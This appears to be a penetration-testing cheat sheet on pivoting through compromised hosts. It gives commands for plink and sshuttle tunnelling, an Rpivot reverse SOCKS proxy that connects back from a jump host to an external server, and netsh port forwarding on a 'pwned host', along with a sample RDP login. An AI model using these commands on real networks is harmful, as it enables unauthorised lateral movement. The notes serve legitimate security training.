# Pivoting Around Obstacles

## Pivoting from Windows attack host

[PuTTYs](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) plink for SSH port forwarding

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

Use [Proxifier](https://www.proxifier.com) or other for localhost:9050 proxy .

## Pivoting with Sshuttle

[Sshuttle](https://github.com/sshuttle/sshuttle) is a python tool that removes the need to configure `proxychains`. Does not provide other options for pivoting over TOR or HTTPS proxy servers.

 `-r` option to connect to the remote machine with a  username and password. Then  include the network or IP we want to route through the pivot host, in this case, the network  172.16.5.0/23.

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# Verify
nmap -v -sV -p3389 172.16.5.19 -A -Pn

# Connect
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Web Server Pivoting

[Rpivot](https://github.com/klsecservices/rpivot) is a python reverse SOCKS proxy tool. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

```bash
# Start server
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer to jump host
cp -r ../rpivot  ubuntu@10.129.202.64:~/

# Connect from jump
python2.7 client.py --server-ip 10.10.15.111 --server-port 9999
Backconnecting to server 10.10.15.111 port 9999

# Test
proxychains firefox-esr 172.16.5.135:80
```

If NTLM auth is required:

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## Port Forwarding with Win NetSH

Port forward from pwned host to server on adjacent network:

```bash
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

# Verify
netsh.exe interface portproxy show v4tov4
```

